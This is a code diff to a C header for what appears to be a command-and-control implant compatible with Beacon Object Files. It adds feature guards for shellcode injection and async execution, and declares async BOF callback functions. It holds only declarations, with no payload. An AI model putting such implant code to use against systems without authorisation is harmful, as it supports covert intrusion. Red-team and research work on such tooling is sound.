@@ -10,10 +10,12 @@
 
 #include "Config.h"
 
-#ifdef INCLUDE_CMD_INLINE_EXECUTE
+#if defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+
+#define INTERNAL_FUNCTIONS_COUNT 34
 
  /* Structures as is in beacon.h */
-extern unsigned char* InternalFunctions[30][2];
+extern unsigned char* InternalFunctions[INTERNAL_FUNCTIONS_COUNT][2];
 
 typedef struct _ARG {
     char* value;
@@ -23,14 +25,14 @@ typedef struct _ARG {
 
 typedef struct {
     char* original; /* the original buffer [so we can free it] */
-    char* buffer;   /* current pointer into our buffer */
+    char* buffer;   /* current pointer into this buffer */
     int    length;   /* remaining length of data */
     int    size;     /* total size of this buffer */
 } datap;
 
 typedef struct {
     char* original; /* the original buffer [so we can free it] */
-    char* buffer;   /* current pointer into our buffer */
+    char* buffer;   /* current pointer into this buffer */
     int    length;   /* remaining length of data */
     int    size;     /* total size of this buffer */
 } formatp;
@@ -76,6 +78,14 @@ UINT32 swap_endianess(UINT32 indata);
 
 char*   BeaconGetOutputData(int* outsize);
 
-#endif //INCLUDE_CMD_INLINE_EXECUTE
+/* Async BOF APIs (Outflank / Adaptix) */
+void   BeaconWakeup(void);
+HANDLE BeaconGetStopJobEvent(void);
+BOOL   BeaconRegisterThreadCallback(DWORD dwThreadId);
+void   BeaconUnregisterThreadCallback(DWORD dwThreadId);
+
+void   BeaconCompatibilityEnsureHashes(void);
+
+#endif //INCLUDE_CMD_INLINE_EXECUTE || INJECT || ASYNC
 
 #endif
